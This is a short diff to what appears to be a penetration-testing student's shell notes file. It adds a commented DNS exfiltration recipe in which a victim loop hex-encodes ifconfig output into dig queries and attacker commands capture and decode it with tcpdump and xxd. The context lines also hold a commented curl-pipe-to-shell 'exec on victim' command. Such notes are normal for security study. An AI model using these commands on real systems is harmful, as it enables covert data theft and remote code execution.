@@ -102,3 +102,12 @@ alias sharpshooter='echo "cd ~/Desktop/SharedFolder/01-Certifications/01-Offensi
 
 # Exec on victim
 # curl http://127.0.0.1/rev | sh
+
+# DNS Exfiltration
+# https://notsosecure.com/out-band-exploitation-oob-cheatsheet
+# On Victim
+# var=11111 && for b in $(ifconfig|xxd -p ); do var=$((var+1)) && dig  $var.$b.127.0.0.1; done
+
+# On attacker
+# sudo tcpdump -n port 53 | tee file.txt
+# echo "0x$(cat file.txt |tr ' ' '\n' |awk '/127.0.0.1/ {print $1}'|sort -u| cut -d '.' -f 2|tr -d '\n')" | xxd -r -p
